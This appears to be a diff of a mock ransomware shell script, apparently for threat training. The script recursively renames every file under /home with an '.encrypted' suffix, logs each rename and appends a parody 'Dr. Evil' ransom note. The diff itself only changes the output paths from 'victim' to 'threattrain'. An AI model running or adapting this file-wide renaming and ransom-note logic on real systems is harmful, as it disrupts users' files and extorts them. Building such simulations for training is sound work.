@@ -6,9 +6,9 @@ shopt -s globstar  # Enable recursive globbing
 for file in /home/**/*; do
     if [ -f "$file" ]; then  # Check if it's a file (not a directory)
         if mv "$file" "${file}.encrypted"; then
-            echo "Encrypted: $file" >> "/home/victim/encryption_log.txt"
+            echo "Encrypted: $file" >> "/home/threattrain/encryption_log.txt"
         else
-            echo "Failed to encrypt: $file" >> "/home/victim/encryption_log.txt"
+            echo "Failed to encrypt: $file" >> "/home/threattrain/encryption_log.txt"
         fi
     fi
 done
@@ -24,5 +24,5 @@ Now, listen carefully, I demand the sum of... ONE MILLION DOLLARS! Well, not rea
 \nTick-tock, tick-tock, you have 48 hours! And remember, no funny business! I've got sharks with frickin' laser beams!\n\
 \nThrow me a frickin' bone here, and pay the ransom!!!\n\
 \nCheerio,\n\
-Dr. Evil." >> /home/victim/README.txt
+Dr. Evil." >> /home/threattrain/README.txt
 
